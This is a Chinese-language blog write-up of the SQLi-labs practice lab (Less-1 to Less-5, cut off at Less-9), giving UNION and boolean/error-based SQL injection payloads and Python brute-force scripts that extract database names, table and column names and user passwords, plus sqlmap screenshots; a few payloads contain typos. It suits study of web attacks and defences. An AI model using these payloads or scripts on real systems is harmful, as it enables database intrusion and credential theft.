+<p><img loading="lazy" src="../post_pre/pics/SQLi-labs/union2.png" alt="../post_pre/pics/SQLi-labs/union2.png" srcset="../post_pre/pics/SQLi-labs/union2.png?size=small, ../post_pre/pics/SQLi-labs/union2.png?size=medium 1.5x, ../post_pre/pics/SQLi-labs/union2.png?size=large 2x" data-title="../post_pre/pics/SQLi-labs/union2.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这一个可以理解为寻找回显点。</p>
+<p>id=1</p>
+<p><img loading="lazy" src="../post_pre/pics/SQLi-labs/1.png" alt="../post_pre/pics/SQLi-labs/1.png" srcset="../post_pre/pics/SQLi-labs/1.png?size=small, ../post_pre/pics/SQLi-labs/1.png?size=medium 1.5x, ../post_pre/pics/SQLi-labs/1.png?size=large 2x" data-title="../post_pre/pics/SQLi-labs/1.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>id=2</p>
+<p><img loading="lazy" src="../post_pre/pics/SQLi-labs/2.png" alt="../post_pre/pics/SQLi-labs/2.png" srcset="../post_pre/pics/SQLi-labs/2.png?size=small, ../post_pre/pics/SQLi-labs/2.png?size=medium 1.5x, ../post_pre/pics/SQLi-labs/2.png?size=large 2x" data-title="../post_pre/pics/SQLi-labs/2.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>id=-1&rsquo; union select 1,2,3&ndash;+</p>
+<p><img loading="lazy" src="../post_pre/pics/SQLi-labs/3.png" alt="../post_pre/pics/SQLi-labs/3.png" srcset="../post_pre/pics/SQLi-labs/3.png?size=small, ../post_pre/pics/SQLi-labs/3.png?size=medium 1.5x, ../post_pre/pics/SQLi-labs/3.png?size=large 2x" data-title="../post_pre/pics/SQLi-labs/3.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>三张图片对比，找到回显点是 <code>name</code> 和 <code>password</code>这两个地方</p>
+<hr>
+<h3 id="2" class="heading-element">
+  <a href="#2" class="heading-mark"></a>2</h3><p><code>id = -1' union select 1, database(), version() --+</code></p>
+<p>用那个测试表</p>
+<p><img loading="lazy" src="../post_pre/pics/SQLi-labs/database1.png" alt="../post_pre/pics/SQLi-labs/database1.png" srcset="../post_pre/pics/SQLi-labs/database1.png?size=small, ../post_pre/pics/SQLi-labs/database1.png?size=medium 1.5x, ../post_pre/pics/SQLi-labs/database1.png?size=large 2x" data-title="../post_pre/pics/SQLi-labs/database1.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<ul>
+<li>
+<p>最上面的那行告诉了回显点在 1 和 3</p>
+</li>
+<li>
+<p>在SQL语句中找到相应位置进行修改</p>
+</li>
+<li>
+<p>最后可以看到在 1 和 3 对应的位置，分别修改成了 数据库的名称 demo 和版本 8.0.34</p>
+</li>
+</ul>
+<hr>
+<h2 id="group_concat" class="heading-element">
+  <a href="#group_concat" class="heading-mark"></a>Group_concat</h2><p>到这里的时候换了一个数据库，所以数据库内容有些许不同。</p>
+<blockquote>
+<p>GROUP_CONCAT时MySQL数据库提供的一个聚合函数</p>
+</blockquote>
+<p>在数据库测试</p>
+<p><code>SELECT * FROM user WHERE id='-1' UNION SELECT 1, 2, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='demosql' -- ;</code></p>
+<p><img loading="lazy" src="../post_pre/pics/SQLi-labs/groupconcat1.png" alt="../post_pre/pics/SQLi-labs/groupconcat1.png" srcset="../post_pre/pics/SQLi-labs/groupconcat1.png?size=small, ../post_pre/pics/SQLi-labs/groupconcat1.png?size=medium 1.5x, ../post_pre/pics/SQLi-labs/groupconcat1.png?size=large 2x" data-title="../post_pre/pics/SQLi-labs/groupconcat1.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>不过在demo界面进行测试的时候出了点意外：</p>
+<ul>
+<li>查询失败: SELECT command denied to user &lsquo;demo&rsquo;@&rsquo;localhost&rsquo; for table &rsquo;tables&rsquo;</li>
+</ul>
+<p>悲伤的故事，没有足够权限……提权的事情之后说。</p>
+<p>不过我们看sqli lab</p>
+<ul>
+<li><code>id=-1%27%20union%20select%201,2,%20GROUP_CONCAT(table_name)%20from%20information_schema.tables%20WHERE%20table_schema=%27security%27--+</code></li>
+</ul>
+<p>也就是</p>
+<ul>
+<li><code>id=-1' union select 1,2, GROUP_CONCAT(table_name) from information_schema.tables WHERE table_schema='security'</code></li>
+</ul>
+<p><img loading="lazy" src="../post_pre/pics/SQLi-labs/concat2.png" alt="../post_pre/pics/SQLi-labs/concat2.png" srcset="../post_pre/pics/SQLi-labs/concat2.png?size=small, ../post_pre/pics/SQLi-labs/concat2.png?size=medium 1.5x, ../post_pre/pics/SQLi-labs/concat2.png?size=large 2x" data-title="../post_pre/pics/SQLi-labs/concat2.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<hr>
+<h3 id="一个位置问题" class="heading-element">
+  <a href="#%e4%b8%80%e4%b8%aa%e4%bd%8d%e7%bd%ae%e9%97%ae%e9%a2%98" class="heading-mark"></a>一个位置问题</h3><p>这里也有一个有趣的点，</p>
+<p>如果你是写成  1，group_concat.., 3 那么就会报错</p>
+<ul>
+<li>UNION SELECT 选择了 <strong>两个</strong> 表达式：<b>1, GROUP_CONCAT(table_name)</b>。</li>
+</ul>
+<p>而上面的 1，2，group_concatxxx</p>
+<ul>
+<li>UNION SELECT 选择了 <strong>三个</strong> 表达式：<b>1, 2, GROUP_CONCAT(table_name)</b>。</li>
+</ul>
+<p>原因也很简单（找半天）： WHERE 后面指定的 键不能有 <code>,</code>，会引起语法错误。</p>
+<p><img loading="lazy" src="../post_pre/pics/SQLi-labs/error1.png" alt="../post_pre/pics/SQLi-labs/error1.png" srcset="../post_pre/pics/SQLi-labs/error1.png?size=small, ../post_pre/pics/SQLi-labs/error1.png?size=medium 1.5x, ../post_pre/pics/SQLi-labs/error1.png?size=large 2x" data-title="../post_pre/pics/SQLi-labs/error1.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这个语句的目的是将 SELECT <code>*</code> FROM user WHERE id=&rsquo;-1&rsquo; 的结果与SELECT 1, 2, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=&lsquo;demosql&rsquo;的结果合并在一起。</p>
+<p>因为SELECT <code>*</code> FROM user选择了3个列（该user表中有3个列），所以UNION SELECT也需要选择3个值，以便结果的列数相同。</p>
+<hr>
+<p>但是也不是不能把 3 写在后面，但是不是 最后面：</p>
+<ul>
+<li><code>SELECT * FROM user WHERE id='-1' UNION SELECT 1, GROUP_CONCAT(table_name), 3 FROM information_schema.tables WHERE table_schema='demosql' -- ;</code></li>
+</ul>
+<p>payload version:</p>
+<ul>
+<li><code>?id=-1' UNION SELECT 1, GROUP_CONCAT(table_name), 3 FROM information_schema.tables WHERE table_schema='demosql' --+</code></li>
+</ul>
+<p><img loading="lazy" src="../post_pre/pics/SQLi-labs/concat3.png" alt="../post_pre/pics/SQLi-labs/concat3.png" srcset="../post_pre/pics/SQLi-labs/concat3.png?size=small, ../post_pre/pics/SQLi-labs/concat3.png?size=medium 1.5x, ../post_pre/pics/SQLi-labs/concat3.png?size=large 2x" data-title="../post_pre/pics/SQLi-labs/concat3.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="多输出" class="heading-element">
+  <a href="#%e5%a4%9a%e8%be%93%e5%87%ba" class="heading-mark"></a>多输出？</h3><p>前面提到即使注释掉了 LIMIT 0, 1 也还有一个if条件语句进行输出限制，为什么这里多个表名就能一起输出了？（有这个疑问一方面是我和那个if斗争太久，一方面是没怎么去看group_concat的作用。）</p>
+<p>原因 is：</p>
+<blockquote>
+<p>当使用GROUP_CONCAT(table_name)来获取所有的表名时，所有的表名都会被连接成一个长字符串，然后作为一条记录返回。</p>
+</blockquote>
+<hr>
+<h3 id="shoot" class="heading-element">
+  <a href="#shoot" class="heading-mark"></a>shoot</h3><p>查询表内列名：</p>
+<p><code>?id=-1' UNION SELECT 1, GROUP_CONCAT(column_name), 3 FROM information_schema.columns WHERE table_name='users' --+</code></p>
+<p>得到列名之后进一步 查询id, 用户及其密码：</p>
+<p><code>?id=-1' UNION SELECT 1, GROUP_CONCAT(id, username, password), 3 FROM users --+</code></p>
+<p>所以基本的SQL注入语句就是上述几种。对于 Less-1， Less-2完全够用了。Less-1和Less-2~4的去捏也只是 SQL 执行语句对于 $id 的闭合方式的不同。</p>
+<ul>
+<li>
+<p>Less-1： $sql=&ldquo;SELECT * FROM users WHERE id=&rsquo;$id&rsquo; LIMIT 0,1&rdquo;;</p>
+</li>
+<li>
+<p>Less-2： $sql=&ldquo;SELECT * FROM users WHERE id=$id LIMIT 0,1&rdquo;;</p>
+</li>
+</ul>
+<p>&hellip;</p>
+<p>在Less-2的这种情况下就不用加 <code>'</code>进行闭合。</p>
+<p>不过除了引号闭合，还有其他的符号，在后面的Less就会出现。</p>
+<p>不想重复该过程所以可以考虑写脚本进行。</p>
+<hr>
+<p>简单理解，information_schema是一个MySQL创建的信息数据库，保存着MySQL服务维护的所有的其他数据库的信息，但只读，不支持其他操作。</p>
+<p><a href="https://zhuanlan.zhihu.com/p/88342863"target="_blank" rel="external nofollow noopener noreferrer">information_schema是什么</a></p>
+<h1 id="less-5" class="heading-element">
+  <a href="#less-5" class="heading-mark"></a>Less-5</h1><p>SQL语句和Less-1一致，但是在回显这里有不同：</p>
+<div class="highlight" id="id-5"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;font size=&#34;5&#34; color=&#34;#FFFF00&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;You are in...........&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;font size=&#34;3&#34; color=&#34;#FFFF00&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&lt;/font&gt;&#34;</span><span class="p">;</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#0000ff&#34; font size= 3&gt;&#39;</span><span class="p">;</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这意味着 查询到结果并不会返回，只会告诉你 You are in &hellip;&hellip;&hellip;..。</p>
+<p>但是输入 id=1&rsquo;使其报错，它确实返回了错误信息。</p>
+<p>报错注入就是这样诞生的。</p>
+<p>想要从前端得到信息，就从会返回信息的前端界面接收。（感觉说起来要么是废话要么就是得道禅师会说的）</p>
+<h2 id="报错注入" class="heading-element">
+  <a href="#%e6%8a%a5%e9%94%99%e6%b3%a8%e5%85%a5" class="heading-mark"></a>报错注入</h2><p>因为是用MySQL数据库作为demo，所以用的函数也是MySQL的，不过道理一个样，其他类型数据库顶多是换个函数的区别。</p>
+<p>先来认识几个常用函数</p>
+<ul>
+<li><strong>length()</strong></li>
+</ul>
+<p>判断查询结果长度</p>
+<ul>
+<li><strong>substr()</strong></li>
+</ul>
+<p>截取每一个字符，并穷举出字符内容</p>
+<p><code>id=1 and exists(select * from information_schema.tables)--+</code></p>
+<p>查询database名长度</p>
+<p><code>id=1' and length((select database()))&gt;9 --+</code></p>
+<div class="highlight" id="id-6"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url_template</span> <span class="o">=</span> <span class="s1">&#39;http://xxx/sqli-labs-master/Less-5/?id=1</span><span class="se">\&#39;</span><span class="s1"> and length((select database()))=</span><span class="si">{}</span><span class="s1"> --+&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">length</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">guess_length</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_template</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;You are in&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">guess_length</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">length</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;The length of the database name is: </span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>再通过substr()和ASCII查询到database名</p>
+<p><code>id=1' and ascii(substr((select database()), 1, 1))=115 --+</code></p>
+<p>substr(a,b,c)</p>
+<ul>
+<li>
+<p>a为截取的字符串</p>
+</li>
+<li>
+<p>b为截取的位置</p>
+</li>
+<li>
+<p>c为截取的长度</p>
+</li>
+</ul>
+<p>一个简单脚本</p>
+<div class="highlight" id="id-7"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://xxx/sqli-labs-master/Less-5/?id=1</span><span class="se">\&#39;</span><span class="s1"> and ascii(substr((select database()), </span><span class="si">{0}</span><span class="s1">, 1))=</span><span class="si">{1}</span><span class="s1"> --+&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">guess_character</span><span class="p">(</span><span class="n">position</span><span class="p">,</span> <span class="n">ascii_value</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">position</span><span class="p">,</span> <span class="n">ascii_value</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;You are in&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">chr</span><span class="p">(</span><span class="n">ascii_value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">position</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">characters</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">ascii_value</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">127</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">character</span> <span class="o">=</span> <span class="n">guess_character</span><span class="p">(</span><span class="n">position</span><span class="p">,</span> <span class="n">ascii_value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">character</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">characters</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">character</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">position</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">character</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">database_name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">characters</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">database_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>免去一个字一个字手动操作的不必要的事情，当然，用sqlmap比较方便。</p>
+<ul>
+<li>
+<p><code>id = 1' and length((select group_concat(table_name) from information_schema.tables where table_schema = database()))&gt;13 --+</code></p>
+</li>
+<li>
+<p><code>id = 1' and ascii(substr(group_concat(table_name) from information_schema.tables where table_shcema = database()),1 ,1))&gt;99 --+</code></p>
+</li>
+<li>
+<p><code>id = 1' and length((select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = 'users'))&gt;13 --+</code></p>
+</li>
+<li>
+<p><code>id = 1' and ascii(substr(group_concat(column_name) from information_schema.columns where table_shcema = database() and table_name = 'users'),1 ,1))&gt;99 --+</code></p>
+</li>
+<li>
+<p><code>id = 1' and length((select group_concat(username, password) from users))&gt;13 --+</code></p>
+</li>
+<li>
+<p><code>id = 1' and ascii(substr(group_concat(username, password) from users),1 ,1))&gt;99 --+</code></p>
+</li>
+</ul>
+<p>想过要不要写一个整合的代码，但sqlmap比较好用，等我以后来补充。</p>
+<p>sqlmap be like:</p>
+<p><img loading="lazy" src="../post_pre/pics/SQLi-labs/sqlmap2.png" alt="../post_pre/pics/SQLi-labs/sqlmap2.png" srcset="../post_pre/pics/SQLi-labs/sqlmap2.png?size=small, ../post_pre/pics/SQLi-labs/sqlmap2.png?size=medium 1.5x, ../post_pre/pics/SQLi-labs/sqlmap2.png?size=large 2x" data-title="../post_pre/pics/SQLi-labs/sqlmap2.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="../post_pre/pics/SQLi-labs/sqlmap3.png" alt="../post_pre/pics/SQLi-labs/sqlmap3.png" srcset="../post_pre/pics/SQLi-labs/sqlmap3.png?size=small, ../post_pre/pics/SQLi-labs/sqlmap3.png?size=medium 1.5x, ../post_pre/pics/SQLi-labs/sqlmap3.png?size=large 2x" data-title="../post_pre/pics/SQLi-labs/sqlmap3.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="../post_pre/pics/SQLi-labs/sqlmap1.png" alt="../post_pre/pics/SQLi-labs/sqlmap1.png" srcset="../post_pre/pics/SQLi-labs/sqlmap1.png?size=small, ../post_pre/pics/SQLi-labs/sqlmap1.png?size=medium 1.5x, ../post_pre/pics/SQLi-labs/sqlmap1.png?size=large 2x" data-title="../post_pre/pics/SQLi-labs/sqlmap1.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><code>#科技的力量</code></p>
+<hr>
+<h1 id="less-9" class="heading-element">
+  <a href="#less-9" class="heading-mark"></a>Less-9</h1><p>上面的是报错注入，后面的还有一种盲注，对报错信息进行了处理——即它不告诉你。</p>
+<div class="highlight" id="id-8"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
